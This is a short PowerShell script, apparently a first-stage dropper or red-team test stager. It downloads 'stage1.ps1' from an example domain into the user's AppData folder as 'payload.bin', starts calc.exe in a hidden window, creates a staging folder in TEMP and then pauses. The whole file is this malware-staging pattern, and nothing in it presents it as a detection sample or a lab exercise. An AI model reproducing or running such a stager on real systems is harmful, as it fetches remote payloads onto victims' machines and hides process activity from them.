[CmdletBinding()]
param(
    [string]$TransferUrl = "https://adatum.com/stage1.ps1",
    [string]$DownloadPath = "$env:APPDATA\payload.bin",
    [int]$TimeoutSec = 88
)
Invoke-WebRequest -Uri $TransferUrl -OutFile $DownloadPath -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Start-Sleep -Seconds 37
